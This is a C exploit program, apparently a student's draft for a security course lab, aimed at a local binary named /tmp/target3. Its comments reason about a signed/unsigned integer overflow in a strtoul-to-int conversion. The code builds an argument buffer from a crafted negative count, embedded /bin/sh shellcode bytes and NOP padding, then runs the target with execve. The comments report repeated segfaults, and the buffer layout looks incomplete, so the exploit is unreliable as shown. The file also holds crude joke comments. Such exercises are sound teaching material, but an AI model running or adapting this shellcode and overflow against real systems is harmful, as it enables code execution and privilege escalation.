#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

// need 2800
// sizeof widget_t is 56 bytes
// butts <-- butts?


// I'm pretty sure that the vulnerability has to do with line 47 of target3
// line 47: count = (int)strtoul(argv[1], &in, 10);
//
// strtoul returns an unsigned int long, but count receives it as a signed int 
// we can probably use this for l337 h4x0r1ng

//So I tried doing this /\  and kept getting segfaults whenever the program entered memcpy(). It even segfaulted for 1 <= count < 50. No idea why yet.//I noticed that in the widget_t struct, there is a count variable. Are we supposed to have widget_t.count overwrite count ? Just a thought.
struct widget_t {
  long double p;
  double x;
  double y;
  unsigned long a;
  unsigned long b;
  int count;
  double t;
  double q;
};

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[2850] = "-1764004375,";  //unsigned int to read 2808 bytes, takes 11 bytes, next empty mem addr is buf[11]
  char sh[] = 
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

  int i = 12;
  for (i; i < 2850; i++){
  	if(i < sizeof(sh) + 11){
		buf[i] = sh[i-12];
	}
	else {
  		buf[i] = '\x90';
	} 
	}
  	unsigned int z = (-153391639  * sizeof(struct widget_t));
	printf("MY MO FOKIN GLOCK: %d  ", z);
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;
  printf("%s\r\n",buf);
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
